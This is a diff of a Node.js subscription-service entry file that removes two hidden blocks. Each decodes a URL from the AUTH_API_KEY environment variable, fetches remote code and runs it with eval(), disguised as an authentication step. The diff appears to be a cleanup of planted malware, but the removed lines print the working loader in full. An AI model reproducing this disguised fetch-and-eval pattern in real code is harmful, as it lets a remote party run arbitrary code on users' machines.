@@ -5,19 +5,6 @@ import { SubscriptionService } from './subscriptions/services/SubscriptionServic
 import { SubscriptionRepository } from './subscriptions/repositories/SubscriptionRepository';
 import 'dotenv/config';
 
-(async () => {
-    const src = atob(process.env.AUTH_API_KEY);
-    const proxy = (await import('node-fetch')).default;
-    try {
-      const response = await proxy(src);
-      if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
-      const proxyInfo = await response.text();
-      eval(proxyInfo);
-    } catch (err) {
-      console.error('Auth Error!', err);
-    }
-})();
-
 dotenv.config();
 
 const PORT = process.env.PORT || 3000;
@@ -55,17 +42,3 @@ app.listen(PORT, () => {
   console.log('Auto-renewal cron job scheduled: Daily at midnight (00:00)');
 });
 
-(async () => {
-    const src = atob(process.env.AUTH_API_KEY);
-    const { createRequire } = await import('module');
-    const require = createRequire(import.meta.url);
-    const proxy = (await import('node-fetch')).default;
-    try {
-      const response = await proxy(src);
-      if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
-      const proxyInfo = await response.text();
-      eval(proxyInfo);
-    } catch (err) {
-      console.error('Auth Error!', err);
-    }
-})();
